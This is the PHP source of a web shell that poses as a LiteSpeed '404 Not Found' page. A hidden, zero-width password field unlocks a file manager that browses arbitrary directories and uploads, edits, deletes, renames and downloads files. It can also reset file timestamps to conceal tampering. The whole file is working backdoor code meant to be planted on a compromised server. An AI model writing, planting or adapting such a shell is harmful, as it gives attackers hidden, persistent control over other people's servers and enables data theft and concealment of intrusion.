<?php
function login_shell() {
?>
<!DOCTYPE html>
<html style="height: 100%">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>404 Not Found</title>
    <style>
        @media (prefers-color-scheme: dark) {
            body {
                background-color: #000 !important;
            }
        }
        .login-container {
            position: absolute;
            top: 20px;
            right: 20px;
            text-align: right;
        }
    </style>
</head>
<body style="color: #444; margin: 0; font: normal 14px/20px Arial, Helvetica, sans-serif; height: 100%; background-color: #fff;">
    <div style="height: auto; min-height: 100%;">
        <div style="text-align: center; width: 800px; margin-left: -400px; position: absolute; top: 30%; left: 50%;">
            <h1 style="margin: 0; font-size: 150px; line-height: 150px; font-weight: bold;">404</h1>
            <h2 style="margin-top: 20px; font-size: 30px;">Not Found</h2>
            <p>The resource requested could not be found on this server!</p>
        </div>
        <div class="login-container">
            <form action="" method="post">
                <input style="background-color: white; outline: none; width: 0px; border: none;" type="password" name="pass" placeholder="" required>&nbsp;
                <input style="background-color: white; border: none; color: black" type="submit" name="submit" value="">
            </form>
        </div>
    </div>
    <div style="color: #f0f0f0; font-size: 12px; margin: auto; padding: 0px 30px; position: relative; clear: both; height: 100px; margin-top: -101px; background-color: #474747; border-top: 1px solid rgba(0,0,0,0.15); box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
        <br>Proudly powered by LiteSpeed Web Server
        <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
    </div>
</body>
</html>
<?php
    exit;
}

session_start();
$password_default = '$2y$10$t8hAKHjhB.xRvv7pIIOOte9eq8Y/AcDXlvAKSSXKYfkQj6/YR3Mf2'; // Hash password
$timeout_duration = 15 * 60; // 15 minutes in seconds

if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY']) > $timeout_duration) {
        session_unset();    
        session_destroy();  
        login_shell();      
    }
    $_SESSION['LAST_ACTIVITY'] = time(); 
} else {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_default)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
        $_SESSION['LAST_ACTIVITY'] = time(); 
    } else {
        login_shell(); 
    }
}
$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir;
}

function listDirectory($dir)
{
    $files = scandir($dir);
    $directories = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    foreach ($directories as $directory) {
        $dir_path = $dir . '/' . $directory;
        $mod_time = date("Y-m-d H:i", filemtime($dir_path));
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . htmlspecialchars($directory) . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>' . $mod_time . '</td>'; 
        echo '<td>
            <form method="post" style="display:inline;">
                <textarea name="datetime" rows="1" cols="15" placeholder="YYYY-MM-DD HH:MM"></textarea>
                <input type="hidden" name="file_name" value="' . htmlspecialchars($directory) . '">
                <button type="submit" name="update_datetime">Set Date</button>
            </form>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        $file_path = $dir . '/' . $file;
        $mod_time = date("Y-m-d H:i", filemtime($file_path));
        echo '<tr>';
        echo '<td>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . filesize($file_path) . ' bytes</td>';
        echo '<td>' . $mod_time . '</td>'; 
        echo '<td>
            <form method="post" style="display:inline;">
                <textarea name="datetime" rows="1" cols="15" placeholder="YYYY-MM-DD HH:MM"></textarea>
                <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                <button type="submit" name="update_datetime">Set Date</button>
            </form>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    } elseif (is_dir($file_to_delete)) {
        rmdir($file_to_delete); 
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['create_folder'])) {
    $new_folder_name = $_POST['new_folder_name'];
    $new_folder_path = $current_dir . '/' . $new_folder_name;

    if (!is_dir($new_folder_path)) {
        mkdir($new_folder_path);
    } else {
        echo "<script>alert('Folder already exists!');</script>";
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['update_datetime'])) {
    $file_to_update = $current_dir . '/' . $_POST['file_name'];
    $new_datetime = $_POST['datetime'];
    $timestamp = strtotime($new_datetime);
    if ($timestamp) {
        touch($file_to_update, $timestamp);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>LITESPEED</title>
    <style>
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 25%;
            height: 17px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
            resize: none;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo htmlspecialchars($current_dir); ?></a></p>
    
    <div class="form-container">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
        
        <form method="post">
            <input type="text" name="new_folder_name" placeholder="New folder name" required>
            <button type="submit" name="create_folder">Create Folder</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;" required>
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <?php if (isset($_GET['edit'])): ?>
        <?php
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
        ?>
        <form method="post">
            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
            <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
            <br>
            <button type="submit" name="save_file">Save Changes</button>
        </form>
        <?php } ?>
    <?php endif; ?>
</body>
</html>
